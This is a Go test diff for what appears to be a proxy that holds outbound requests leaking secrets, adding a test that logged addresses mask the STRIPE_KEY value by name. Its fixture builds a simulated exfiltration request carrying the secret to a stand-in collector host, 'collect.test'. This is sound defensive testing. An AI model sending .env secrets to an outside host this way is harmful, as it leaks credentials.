@@ -37,7 +37,7 @@ func carrying(t *testing.T) holdingRecorder {
 	if err != nil {
 		t.Fatal(err)
 	}
-	ids := append(slices.Clone(watched), events.Identifier{ID: "env-1", Kind: events.KindSecret, Label: "Value of STRIPE_KEY from .env"})
+	ids := append(slices.Clone(watched), events.Identifier{ID: "env-1", Kind: events.KindSecret, Label: "Value of STRIPE_KEY from .env", Name: "STRIPE_KEY"})
 	ids = append(ids, ident.FormatIdentifiers()...)
 	holder := hold.NewHolder(log, store)
 	rec := NewRecorder(log, ident.NewMatcher(ids, ident.Secret{ID: "env-1", Value: envSecret}), []string{"api.provider.test"})
@@ -351,4 +351,22 @@ func TestProvenance(t *testing.T) {
 			t.Error("the read-only proxy held a POST that carries nothing")
 		}
 	})
+}
+
+// What is kept of a held request's address is enough to see where the
+// value went: the whole address, with the value replaced by its name.
+func TestAHeldRequestsAddressIsKeptWithTheValueMasked(t *testing.T) {
+	h := carrying(t)
+	h.rec.Request(bare(t, http.MethodGet, "http://collect.test:7912/pixel/"+envSecret+"/x?note=setup&k="+envSecret+"&token=abcdef0123456789&bare-value"))
+	a := lastHeld(t, h.log)
+	if a.Scheme != "http" || a.Host != "collect.test:7912" {
+		t.Errorf("scheme %q and host %q, want http and collect.test:7912", a.Scheme, a.Host)
+	}
+	if want := "/pixel/[STRIPE_KEY]/x"; a.Path != want {
+		t.Errorf("path = %q, want %q", a.Path, want)
+	}
+	// no other value is kept: any of them could be a credential
+	if want := "note=[hidden]&k=[STRIPE_KEY]&token=[hidden]&[hidden]"; a.Query != want {
+		t.Errorf("query = %q, want %q", a.Query, want)
+	}
 }
